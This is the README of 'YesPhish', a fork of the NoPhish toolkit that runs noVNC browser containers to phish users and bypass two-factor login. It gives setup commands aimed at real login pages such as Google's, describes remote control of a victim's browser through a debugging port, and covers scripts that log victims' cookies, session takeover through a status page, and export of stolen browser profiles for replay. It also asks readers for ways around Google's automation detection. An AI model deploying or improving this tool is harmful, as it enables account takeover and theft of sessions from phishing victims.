# YesPhish

This is a fork of [NoPhish](https://github.com/powerseb/NoPhish) (by `powerseb`) with improvements and bugfixes.

> [!IMPORTANT]
> This is the `patchright-chrome` branch, an experiment that totally replaces Firefox with a patched Chrome version that supports undetected browser automation.

> [!NOTE]
> In this branch, all periodic session/cookie/profile dumps were disabled, as it's more complicated to perform these steps using Chrome's profile files than it is in Firefox. Use the provided `scripts/` or make your own `patchright` script to interact with the browser and dump information such as browser cookies (`biscuits.py` has a working example)
> Specifying custom preferences for the browser will also not work. Please change Chrome's command-line flags if you must.

## Changes in this fork

* Refactored `setup.sh` to make it more modular & easier to maintain
* Moved files that are mostly static into the Docker images instead of the setup.sh script
* Added the `-x` option to spawn firefox with remote debugging port exposed to the host at address `localhost:9XXX` to allow for the use of browser automation (for example with puppeteer)
* Added the `-l` option to allow the user to choose a language to be set as a custom preference
* Builtin puppeteer scripts to control the target browser & log cookies / navigation information
* Fixed some conditions that caused NoPhish to not load properly sometimes due to processes being spawn before the desktop environment was up
* Set the cookie collector loop to every 5 seconds, which is more realistic than 60
* Colored & cleaner output
* Mobile mode can now be toggled on/off with `-m true` / `-m false` (default)
* Other miscellaneous bugfixes

## Usage

All existing features of NoPhish [should] work the same way. The following features were added:

### Language

The `-l` option is just a helper to set the preferred languages of the browser.

It can be set to a list of values - as long as it doesn't include spaces.

Example:
```bash
$ ./setup.sh -u 1 -t https://target -d hello.local -l es,ru
```

### Editing Preferences

This was a bit annoying in NoPhish (it required changing 4 places in the code). In YesPhish you can just edit the `templates/user.header.js` with your desired values and rerun `setup.sh`.

### Mobile Mode

In the latest commit of NoPhish, mobile mode was enabled by default, spawning 2 containers for each victim (one for desktop requests and another for mobile requests). In YesPhish mobile mode is disabled by default and you can toggle the use of the mobile mode by specifying `-m true`.

### RemoteDebuggingPort

With YesPhish it's possible to control the target browser remotely. Just toggle the `-x` flag:

```bash
$ ./setup.sh -u 1 -t https://target -d hello.local -x true
[...]
[~] Generating configuration file
[+] Configuration file generated
[-] Starting containers
———— vnc-user1 (from image vnc-docker) [1/2] ————
[+] RemoteDebuggingPort: 9001
[...]
———— vnc-muser2 (from image vnc-docker) [1/2] ————
[+] RemoteDebuggingPort: 9002
[...]
```

For each user container, a port between `9001` and `9999` is mapped to the host.

This is the remote debugging port of the browser running in that container, and can be used to connect and control the browser with tools such as [Puppeteer](https://github.com/puppeteer/puppeteer):

```bash
$ npm install puppeteer
```

For example, the `scripts/control.js` file is a Puppeteer script that connects to your browser running in the container and spawns a REPL where you can freely interact with the `browser` object:

```bash
$ node scripts/control.js 9001
[+] Attempting to connect to: ws://127.0.0.1:9001/session
[+] Successfully connected to Firefox!
[+] Use the `browser` object in the JS shell below to control the browser.
> (await browser.pages())[0].url()
'https://www.google.com/'
> (await browser.pages())[0].goto("https://www.yahoo.com")
Promise {
  <pending>,
  [Symbol(async_id_symbol)]: 758,
  [Symbol(trigger_async_id_symbol)]: 751
}
```

Another example is the `scripts/log.js` which can be used to log accessed pages and cookies set during the navigation:

```bash
$ node scripts/log.js 9001
[+] Attempting to connect to: ws://127.0.0.1:9001/session
[+] Successfully connected to Firefox!
[2025-05-09T12:42:18.085Z] [page.request] URL: https://www.google.com/recaptcha/api2/replaceimage?k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b
[2025-05-09T12:42:18.334Z] [page.response] URL: https://www.google.com/recaptcha/api2/replaceimage?k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b | Status: 200
[2025-05-09T12:42:18.335Z] [page.requestfinished] URL: https://www.google.com/recaptcha/api2/replaceimage?k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b
[2025-05-09T12:42:18.342Z] [page.request] URL: https://www.google.com/recaptcha/api2/payload?p=06AFcWeA6uTvj9strt0xT_K_4AOOs7LL7Kxj4aw9tae_XwAZeqCYh1kruqKR9RArdnKSG3oqfiuR85_lJVHL-ymg1z2bMNpIbxRGkbPMNrd7THXtxdXvOIhdNgeEf39sk8BIHY48T3u4147MHeQP4EiDbhaJefheIokoAQZXX70da6yvYLo16tJsSheoIzCBBMf_QI3D3VreXZQIXQageGWkmwStxmTR5y8w&k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b&id=1040911e67ca0861
[2025-05-09T12:42:18.499Z] [page.response] URL: https://www.google.com/recaptcha/api2/payload?p=06AFcWeA6uTvj9strt0xT_K_4AOOs7LL7Kxj4aw9tae_XwAZeqCYh1kruqKR9RArdnKSG3oqfiuR85_lJVHL-ymg1z2bMNpIbxRGkbPMNrd7THXtxdXvOIhdNgeEf39sk8BIHY48T3u4147MHeQP4EiDbhaJefheIokoAQZXX70da6yvYLo16tJsSheoIzCBBMf_QI3D3VreXZQIXQageGWkmwStxmTR5y8w&k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b&id=1040911e67ca0861 | Status: 200
[2025-05-09T12:42:18.500Z] [page.requestfinished] URL: https://www.google.com/recaptcha/api2/payload?p=06AFcWeA6uTvj9strt0xT_K_4AOOs7LL7Kxj4aw9tae_XwAZeqCYh1kruqKR9RArdnKSG3oqfiuR85_lJVHL-ymg1z2bMNpIbxRGkbPMNrd7THXtxdXvOIhdNgeEf39sk8BIHY48T3u4147MHeQP4EiDbhaJefheIokoAQZXX70da6yvYLo16tJsSheoIzCBBMf_QI3D3VreXZQIXQageGWkmwStxmTR5y8w&k=6LfwuyUTAAAAAOAmoS0fdqijC2PbbdH4kjq62Y1b&id=1040911e67ca0861
```

Besides these samples, the `scripts/biscuits.js` can also be used to log cookies set during the victim's navigation.

> [!IMPORTANT]  
> Be aware that some targets, such as *Google*, use magic tricks to detect when your browser is being controlled by a third-party, and *block the sign-in attempt* before the victim can even enter the password, so this technique won't work for phishing these targets.
> If I knew how these tricks worked by the time I wrote this tool I would have fixed it - there are many open issues in repos related to Puppeteer about this behavior, but none of the answers seemed to work as of 05/2025.
> If you find a solution let me know :-) 

> [!NOTE]  
> If the Puppeteer process exits abruptely but the browser session isn't disconnected properly, the 
> session can be stuck and YesPhish will have to be restarted. This shouldn't happen usually, but it's worth noting.

# NoPhish
 
Another phishing toolkit which provides an docker and noVNC based infrastructure. The whole setup is based on the initial article of [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) and [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html).

A detailed description of the setup can be found here - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## Installation

Ensure that docker is installed and working.

Install the required python modules:

```console
pip install lz4
```

Install the setup (which will create the required docker images):

```console
setup.sh install
```

## Execution

The setup offers the following parameters:

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```

A basic run looks like the following:

```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```

During the run the following overview provides a status per URL how many cookies or session informations have been gathered.

```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```

Please note that the tool will export all cookies / session information even when it is not related to a successfull login.

Further you can also directly interact with the tool on the status page - `http(s)://%DOMAIN%:65534/status.php`. There you have the possability to disconnect the user and directly take over the session. 

In the current version of the tool for every user two containers are spawned - one for desktops and one for mobile devices. Based on the user agent the target gets redirected to suitable container. The output of the mobile container is named with a leading "m" (e.g. mphis1-ffprofile). 

## Using profile export
If you are using the complete FireFox profile export, you can just call firefox with -profile like that:

On Windows:
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

On Linux:
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

Everything is getting restored, including the latest site.

Please note by default you need to extract the zip archive or set the parameter `-z` to `false`. If the export format `-e simple` is chosen two json files will be generated which can be used with Cookiebro which is available for [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) and [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn).


## CleanUp

During a run the script can be terminated with `ctrl` + `c` - all running docker container will then be deleted. To fully remove the setup run `setup.sh cleanup`.
